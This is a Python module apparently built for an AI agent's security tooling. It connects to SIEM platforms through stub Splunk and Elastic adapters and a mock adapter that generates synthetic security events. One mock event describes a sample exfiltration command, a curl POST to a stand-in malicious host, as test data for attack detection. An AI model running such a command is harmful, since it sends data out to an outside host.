"""
SIEM Connector

Provides integration with Security Information and Event Management (SIEM) systems.
Allows Agent Smith to consume security events from external SIEM platforms and
correlate them with internal boundary daemon events.

Supported SIEM Platforms:
- Splunk (via REST API)
- Elastic SIEM (via Elasticsearch API)
- Microsoft Sentinel (via Azure API)
- Generic syslog (RFC 5424)
- Custom webhook ingestion

Note: This is an aspirational module. Actual SIEM integration requires
appropriate credentials and network access, which are restricted by
the boundary daemon in most modes.
"""

import hashlib
import json
import logging
import queue
import threading
import time
from abc import ABC, abstractmethod
from dataclasses import dataclass, field
from datetime import datetime, timedelta
from enum import Enum, auto
from pathlib import Path
from typing import Any, Callable, Dict, Iterator, List, Optional, Set
from urllib.parse import urljoin

logger = logging.getLogger(__name__)


class SIEMProvider(Enum):
    """Supported SIEM providers."""

    SPLUNK = auto()
    ELASTIC = auto()
    SENTINEL = auto()
    SYSLOG = auto()
    WEBHOOK = auto()
    MOCK = auto()  # For testing


class EventSeverity(Enum):
    """SIEM event severity levels (normalized)."""

    UNKNOWN = 0
    INFORMATIONAL = 1
    LOW = 2
    MEDIUM = 3
    HIGH = 4
    CRITICAL = 5


@dataclass
class SIEMEvent:
    """
    Normalized SIEM event.

    All events from different SIEM providers are normalized to this format
    for consistent processing by the attack detector.
    """

    event_id: str
    timestamp: datetime
    source: str  # Source system/IP
    event_type: str
    severity: EventSeverity
    category: str
    description: str
    raw_data: Dict[str, Any] = field(default_factory=dict)
    metadata: Dict[str, Any] = field(default_factory=dict)

    # Enrichment data (added during processing)
    indicators: List[str] = field(default_factory=list)
    related_events: List[str] = field(default_factory=list)
    mitre_tactics: List[str] = field(default_factory=list)

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary."""
        return {
            "event_id": self.event_id,
            "timestamp": self.timestamp.isoformat(),
            "source": self.source,
            "event_type": self.event_type,
            "severity": self.severity.name,
            "category": self.category,
            "description": self.description,
            "raw_data": self.raw_data,
            "metadata": self.metadata,
            "indicators": self.indicators,
            "related_events": self.related_events,
            "mitre_tactics": self.mitre_tactics,
        }

    @property
    def severity_score(self) -> int:
        """Get numeric severity score."""
        return self.severity.value

    def matches_filter(self, filter_dict: Dict[str, Any]) -> bool:
        """Check if event matches filter criteria."""
        for key, value in filter_dict.items():
            if key == "severity_min":
                if self.severity.value < value:
                    return False
            elif key == "severity_max":
                if self.severity.value > value:
                    return False
            elif key == "category":
                if isinstance(value, list):
                    if self.category not in value:
                        return False
                elif self.category != value:
                    return False
            elif key == "source_pattern":
                import re
                if not re.search(value, self.source):
                    return False
            elif hasattr(self, key):
                if getattr(self, key) != value:
                    return False
        return True


@dataclass
class SIEMConfig:
    """Configuration for SIEM connection."""

    provider: SIEMProvider
    endpoint: str = ""
    api_key: str = ""
    username: str = ""
    password: str = ""
    verify_ssl: bool = True
    timeout: int = 30
    poll_interval: int = 60  # seconds
    batch_size: int = 100
    lookback_minutes: int = 15
    custom_headers: Dict[str, str] = field(default_factory=dict)
    extra_params: Dict[str, Any] = field(default_factory=dict)


class SIEMAdapter(ABC):
    """Abstract base class for SIEM adapters."""

    @abstractmethod
    def connect(self) -> bool:
        """Establish connection to SIEM."""
        pass

    @abstractmethod
    def disconnect(self) -> None:
        """Close connection to SIEM."""
        pass

    @abstractmethod
    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from SIEM."""
        pass

    @abstractmethod
    def is_connected(self) -> bool:
        """Check if connected."""
        pass


class MockSIEMAdapter(SIEMAdapter):
    """
    Mock SIEM adapter for testing and development.

    Generates synthetic security events for testing the attack detection system.
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._event_counter = 0

    def connect(self) -> bool:
        """Simulate connection."""
        self._connected = True
        logger.info("Mock SIEM adapter connected")
        return True

    def disconnect(self) -> None:
        """Simulate disconnection."""
        self._connected = False
        logger.info("Mock SIEM adapter disconnected")

    def is_connected(self) -> bool:
        return self._connected

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Generate mock events."""
        events = []
        now = datetime.now()

        # Generate a few synthetic events
        mock_events = [
            {
                "event_type": "authentication_failure",
                "severity": EventSeverity.MEDIUM,
                "category": "authentication",
                "description": "Multiple failed login attempts detected",
                "source": "10.0.0.50",
            },
            {
                "event_type": "suspicious_command",
                "severity": EventSeverity.HIGH,
                "category": "command_execution",
                "description": "Suspicious command execution: 'curl -X POST http://malicious.com'",
                "source": "agent-process",
            },
            {
                "event_type": "policy_violation",
                "severity": EventSeverity.HIGH,
                "category": "policy",
                "description": "Network access attempted in restricted mode",
                "source": "boundary_daemon",
            },
        ]

        # Only generate events sometimes to simulate real behavior
        import random
        if random.random() < 0.3:
            mock = random.choice(mock_events)
            self._event_counter += 1

            event = SIEMEvent(
                event_id=f"mock_{self._event_counter}",
                timestamp=now,
                source=mock["source"],
                event_type=mock["event_type"],
                severity=mock["severity"],
                category=mock["category"],
                description=mock["description"],
                raw_data={"mock": True, "counter": self._event_counter},
            )

            if not filters or event.matches_filter(filters):
                events.append(event)

        return events


class SplunkAdapter(SIEMAdapter):
    """
    Splunk SIEM adapter.

    Connects to Splunk via REST API to fetch security events.
    Requires network access (typically not available in RESTRICTED mode).
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False
        self._session_key: Optional[str] = None

    def connect(self) -> bool:
        """Connect to Splunk."""
        # In production, would authenticate to Splunk
        logger.info(f"Splunk adapter: Would connect to {self.config.endpoint}")
        self._connected = False  # Simulated - no actual connection
        return False

    def disconnect(self) -> None:
        """Disconnect from Splunk."""
        self._connected = False
        self._session_key = None

    def is_connected(self) -> bool:
        return self._connected

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from Splunk."""
        if not self._connected:
            logger.warning("Splunk adapter not connected")
            return []

        # Would execute Splunk search query here
        # search = f'index=security earliest={since.isoformat()} | ...'
        return []


class ElasticAdapter(SIEMAdapter):
    """
    Elastic SIEM adapter.

    Connects to Elasticsearch/Elastic SIEM to fetch security events.
    """

    def __init__(self, config: SIEMConfig):
        self.config = config
        self._connected = False

    def connect(self) -> bool:
        """Connect to Elastic."""
        logger.info(f"Elastic adapter: Would connect to {self.config.endpoint}")
        self._connected = False
        return False

    def disconnect(self) -> None:
        self._connected = False

    def is_connected(self) -> bool:
        return self._connected

    def fetch_events(
        self,
        since: datetime,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """Fetch events from Elastic."""
        if not self._connected:
            return []

        # Would execute Elasticsearch query here
        return []


class SIEMConnector:
    """
    Main SIEM connector managing multiple SIEM sources.

    Aggregates events from multiple SIEM providers and provides
    a unified event stream for the attack detector.
    """

    def __init__(
        self,
        on_event: Optional[Callable[[SIEMEvent], None]] = None,
    ):
        """
        Initialize SIEM connector.

        Args:
            on_event: Callback for new events
        """
        self.on_event = on_event
        self._adapters: Dict[str, SIEMAdapter] = {}
        self._running = False
        self._poll_thread: Optional[threading.Thread] = None
        self._event_queue: queue.Queue = queue.Queue()
        self._seen_events: Set[str] = set()
        self._lock = threading.Lock()

        # Statistics
        self._stats = {
            "events_received": 0,
            "events_deduplicated": 0,
            "poll_cycles": 0,
            "errors": 0,
        }

    def add_source(
        self,
        name: str,
        config: SIEMConfig,
    ) -> bool:
        """
        Add a SIEM source.

        Args:
            name: Unique name for this source
            config: SIEM configuration

        Returns:
            True if source added successfully
        """
        adapter = self._create_adapter(config)
        if adapter:
            with self._lock:
                self._adapters[name] = adapter
            logger.info(f"Added SIEM source: {name} ({config.provider.name})")
            return True
        return False

    def remove_source(self, name: str) -> bool:
        """Remove a SIEM source."""
        with self._lock:
            if name in self._adapters:
                self._adapters[name].disconnect()
                del self._adapters[name]
                logger.info(f"Removed SIEM source: {name}")
                return True
        return False

    def connect_all(self) -> Dict[str, bool]:
        """Connect all configured sources."""
        results = {}
        with self._lock:
            for name, adapter in self._adapters.items():
                try:
                    results[name] = adapter.connect()
                except Exception as e:
                    logger.error(f"Failed to connect {name}: {e}")
                    results[name] = False
        return results

    def disconnect_all(self) -> None:
        """Disconnect all sources."""
        with self._lock:
            for name, adapter in self._adapters.items():
                try:
                    adapter.disconnect()
                except Exception as e:
                    logger.error(f"Error disconnecting {name}: {e}")

    def start_polling(self, interval: int = 60) -> None:
        """
        Start polling SIEM sources for events.

        Args:
            interval: Poll interval in seconds
        """
        if self._running:
            logger.warning("SIEM polling already running")
            return

        self._running = True
        self._poll_thread = threading.Thread(
            target=self._poll_loop,
            args=(interval,),
            daemon=True,
            name="SIEMPoller",
        )
        self._poll_thread.start()
        logger.info(f"SIEM polling started (interval: {interval}s)")

    def stop_polling(self) -> None:
        """Stop polling SIEM sources."""
        self._running = False
        if self._poll_thread:
            self._poll_thread.join(timeout=5.0)
            self._poll_thread = None
        logger.info("SIEM polling stopped")

    def get_events(
        self,
        max_events: int = 100,
        blocking: bool = False,
        timeout: float = 1.0,
    ) -> List[SIEMEvent]:
        """
        Get queued events.

        Args:
            max_events: Maximum events to return
            blocking: Wait for events if queue empty
            timeout: Timeout for blocking wait

        Returns:
            List of SIEM events
        """
        events = []
        for _ in range(max_events):
            try:
                event = self._event_queue.get(block=blocking, timeout=timeout)
                events.append(event)
                blocking = False  # Only block on first
            except queue.Empty:
                break
        return events

    def fetch_immediate(
        self,
        lookback_minutes: int = 15,
        filters: Optional[Dict[str, Any]] = None,
    ) -> List[SIEMEvent]:
        """
        Fetch events immediately from all sources.

        Args:
            lookback_minutes: How far back to look
            filters: Event filters

        Returns:
            List of events
        """
        events = []
        since = datetime.now() - timedelta(minutes=lookback_minutes)

        with self._lock:
            for name, adapter in self._adapters.items():
                if adapter.is_connected():
                    try:
                        source_events = adapter.fetch_events(since, filters)
                        for event in source_events:
                            event.metadata["siem_source"] = name
                            events.append(event)
                    except Exception as e:
                        logger.error(f"Error fetching from {name}: {e}")
                        self._stats["errors"] += 1

        # Deduplicate
        unique_events = self._deduplicate(events)
        self._stats["events_received"] += len(unique_events)

        return unique_events

    def get_stats(self) -> Dict[str, Any]:
        """Get connector statistics."""
        with self._lock:
            connected = sum(1 for a in self._adapters.values() if a.is_connected())
            return {
                **self._stats,
                "sources_total": len(self._adapters),
                "sources_connected": connected,
                "queue_size": self._event_queue.qsize(),
                "is_polling": self._running,
            }

    def _create_adapter(self, config: SIEMConfig) -> Optional[SIEMAdapter]:
        """Create appropriate adapter for config."""
        adapters = {
            SIEMProvider.MOCK: MockSIEMAdapter,
            SIEMProvider.SPLUNK: SplunkAdapter,
            SIEMProvider.ELASTIC: ElasticAdapter,
            # Add more adapters as needed
        }

        adapter_class = adapters.get(config.provider)
        if adapter_class:
            return adapter_class(config)

        logger.warning(f"No adapter for provider: {config.provider}")
        return None

    def _poll_loop(self, interval: int) -> None:
        """Main polling loop."""
        while self._running:
            try:
                self._stats["poll_cycles"] += 1
                events = self.fetch_immediate()

                for event in events:
                    self._event_queue.put(event)
                    if self.on_event:
                        try:
                            self.on_event(event)
                        except Exception as e:
                            logger.error(f"Event callback error: {e}")

            except Exception as e:
                logger.error(f"Poll cycle error: {e}")
                self._stats["errors"] += 1

            time.sleep(interval)

    def _deduplicate(self, events: List[SIEMEvent]) -> List[SIEMEvent]:
        """Deduplicate events based on event_id."""
        unique = []
        for event in events:
            if event.event_id not in self._seen_events:
                self._seen_events.add(event.event_id)
                unique.append(event)
            else:
                self._stats["events_deduplicated"] += 1

        # Limit seen events set size
        if len(self._seen_events) > 10000:
            # Keep only the most recent half
            self._seen_events = set(list(self._seen_events)[-5000:])

        return unique


def create_siem_connector(
    on_event: Optional[Callable[[SIEMEvent], None]] = None,
    add_mock_source: bool = False,
) -> SIEMConnector:
    """
    Factory function to create a SIEM connector.

    Args:
        on_event: Callback for new events
        add_mock_source: Add a mock source for testing

    Returns:
        Configured SIEMConnector
    """
    connector = SIEMConnector(on_event=on_event)

    if add_mock_source:
        mock_config = SIEMConfig(
            provider=SIEMProvider.MOCK,
            poll_interval=10,
        )
        connector.add_source("mock", mock_config)
        connector.connect_all()

    return connector
